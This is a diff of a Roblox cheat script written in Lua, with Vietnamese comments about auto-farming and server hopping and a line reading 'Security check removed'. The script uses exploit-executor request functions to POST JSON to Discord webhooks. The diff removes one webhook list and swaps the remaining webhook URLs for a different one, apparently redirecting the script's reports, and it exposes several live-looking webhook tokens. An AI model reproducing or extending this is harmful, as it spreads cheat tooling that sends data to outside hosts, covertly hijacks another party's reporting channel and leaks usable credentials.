@@ -15,9 +15,7 @@ print("Script loaded - Security check removed")
 
 -- Phần dưới đây là logic game của bạn (Server Hop, Auto Farm...)
 -- HÃY ĐẢM BẢO BẠN GIỮ NGUYÊN PHẦN CODE BÊN DƯỚI CỦA FILE GỐC (Bắt đầu từ đoạn vu1242...)
-_G.NotifierImagine = {
-    "https://discord.com/api/webhooks/1328327154395517071/oWQN-UaGjXebwT2DFKdLgJ4In_Twh-UHN9Fbp9f7DEEqvH3x5rLB6uorIIGaeVxyDo0x"
-}
+
 local function vu8(p5)
     game:GetService("Players").LocalPlayer:Kick(p5.Name .. " in Server")
     local v6 = {
@@ -26,7 +24,7 @@ local function vu8(p5)
     local v7 = game:GetService("HttpService"):JSONEncode(v6)
     Request = http_request or request or (HttpPost or syn.request)
     Request({
-        Url = "https://discord.com/api/webhooks/1327655127737303041/SG-CzJ09FNgx9Uuim_wh366PLimneLL-J2QI4GGZqPLLDmakPesgqC8c_UnbE9w2iYSi",
+        Url = "https://discord.com/api/webhooks/1210520312785932318/uVXwK79S3-GS-yaoJuoFPm2hw_OUJtlOYswA2iNUNWJh51PuQ5nQnC0_8qfS0WkVMMOc",
         Body = v7,
         Method = "POST",
         Headers = {
@@ -64,7 +62,7 @@ local v16 = vu15({
 }).Body
 local v17 = nil
 local v18 = nil
-local v19 = "https://discord.com/api/webhooks/1057389938783563906/TSahGKGHMYIpQPi8aUpGOKfWmwGdto4HkJDhjN9qNP2V4xu2xdUMTablPGQurHglxjHg"
+local v19 = "https://discord.com/api/webhooks/1210520312785932318/uVXwK79S3-GS-yaoJuoFPm2hw_OUJtlOYswA2iNUNWJh51PuQ5nQnC0_8qfS0WkVMMOc"
 while v17 == nil do
     task.wait(0)
     v17 = game:GetService("HttpService"):JSONDecode(v16)
